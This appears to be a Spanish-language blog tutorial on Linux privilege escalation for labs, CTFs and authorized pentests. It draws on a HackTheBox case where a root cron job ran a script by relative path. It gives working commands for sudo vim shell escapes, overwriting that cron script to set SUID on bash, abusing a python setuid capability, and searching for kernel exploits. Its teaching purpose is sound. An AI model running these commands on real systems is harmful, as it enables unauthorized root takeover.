---
title: "Escalada de privilegios en Linux: lo que reviso en orden"
description: "El orden que sigo para escalar privilegios en Linux: SUID, sudo, cron, capabilities, y el caso real donde LinPEAS no encontró nada y tocó ir a mano."
slug: "linux-privilege-escalation"
category: "Linux"
tags: ["linux", "privilege escalation", "post-explotación"]
date: "2026-05-08"
level: "Avanzado"
---

## La vez que LinPEAS no encontró nada

En una máquina de HackTheBox tenía shell como usuario normal y lancé LinPEAS
esperando la salida habitual llena de líneas en rojo. Salió casi todo verde.
Nada obvio. Tuve que volver a la enumeración manual y resultó que el vector
era una tarea cron que ejecutaba un script con una ruta relativa en vez de
absoluta — algo que LinPEAS no marca como crítico porque no es una mala
configuración de permisos clásica, es un error de scripting. Desde entonces
no me fío de lanzar la herramienta y parar ahí si no encuentra nada
evidente: reviso a mano lo que la herramienta no está diseñada para ver.

> Esto es para máquinas de laboratorio, CTFs, o pentests con autorización.

## El orden que sigo

No reviso todo a la vez. El orden que me ha dado mejor ratio de
tiempo/resultado:

```bash
# 1. Quién soy y qué puedo ejecutar como otro usuario
whoami; id; sudo -l

# 2. SUID — rápido de comprobar, a veces resuelve todo en un comando
find / -perm -4000 -type f 2>/dev/null

# 3. Capabilities — menos conocido que SUID, igual de efectivo
getcap -r / 2>/dev/null

# 4. Cron jobs de root
cat /etc/crontab; ls -la /etc/cron.d/

# 5. Si nada de lo anterior dio nada: kernel exploits
uname -r
```

## sudo -l: lo primero que miro siempre

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vim
```

Si sale algo así, ve directo a GTFOBins antes de intentar nada manual — casi
seguro ya está documentado el escape exacto para ese binario:

```bash
sudo vim -c ':!/bin/sh'
```

Lo que aprendí a base de perder tiempo: algunas versiones de `vim`
modernas tienen el escape ligeramente distinto (`:!/bin/sh` directo vs abrir
vim y luego `:!/bin/sh` desde dentro). Si el primero no funciona, prueba el
segundo antes de asumir que el vector no sirve.

## SUID: el comando de siempre, con una matización

```bash
find / -perm -4000 -type f 2>/dev/null
```

La matización: encontrar el binario SUID es la parte fácil. Lo que de
verdad cuesta es decidir si ese binario concreto, en esa versión concreta,
tiene un escape conocido. No asumas que cualquier SUID es explotable —
muchos sistemas tienen SUID en binarios estándar (`passwd`, `ping`) que no
sirven para nada porque están bien implementados. GTFOBins es la referencia,
pero solo cubre lo que ya está documentado; si el binario no está en la
lista, no significa automáticamente que sea seguro, significa que tienes
que pensarlo tú.

## Cron jobs: el caso de la ruta relativa

Esto fue lo que LinPEAS no marcó en el caso que conté arriba:

```bash
cat /etc/crontab
# */5 * * * * root cd /opt/backup && ./run.sh
```

`./run.sh` con ruta relativa. Si tienes permiso de escritura en
`/opt/backup`, puedes sobrescribir `run.sh` y cuando cron lo ejecute como
root, ejecuta lo que tú pusiste:

```bash
echo 'chmod u+s /bin/bash' > /opt/backup/run.sh
# esperar al siguiente ciclo de cron
/bin/bash -p
```

Esto no aparece como "binario SUID mal configurado" ni como "permiso 777
obvio" — aparece como "alguien escribió un script con buenas prácticas
descuidadas". Por eso vale la pena leer los cron jobs línea por línea, no
solo comprobar permisos de archivo con un script automatizado.

## Capabilities: el primo menos famoso del SUID

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.9 = cap_setuid+ep
```

Si ves algo así, es básicamente equivalente a un SUID pero más granular:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Esto se pasa por alto más que el SUID porque mucha gente revisa solo
`find -perm -4000` y se olvida de `getcap`. En máquinas modernas
endurecidas (donde han quitado SUID de los binarios obvios) a veces el
vector real está aquí.

## Kernel exploits: el último recurso, no el primero

```bash
uname -r
searchsploit linux kernel $(uname -r)
```

Los dejo para el final porque son los más arriesgados — pueden colgar el
sistema, y en un pentest real (no en un CTF) eso es un problema serio si la
máquina es de producción. En un laboratorio, adelante; en un cliente real,
dos veces antes de lanzar uno.

## Herramientas, pero como complemento, no como sustituto

```bash
# LinPEAS — buen primer barrido, no infalible (ver arriba)
./linpeas.sh

# pspy — ve procesos y cron en tiempo real sin necesitar privilegios,
# esto sí me hubiera detectado el caso de la ruta relativa si lo hubiera
# lanzado en vez de fiarme solo de LinPEAS
./pspy64
```

Si vuelvo a tener un caso donde LinPEAS sale limpio, lo primero que hago
ahora es lanzar `pspy` un par de minutos para ver qué se ejecuta de fondo
que no sea evidente desde un análisis estático de permisos.
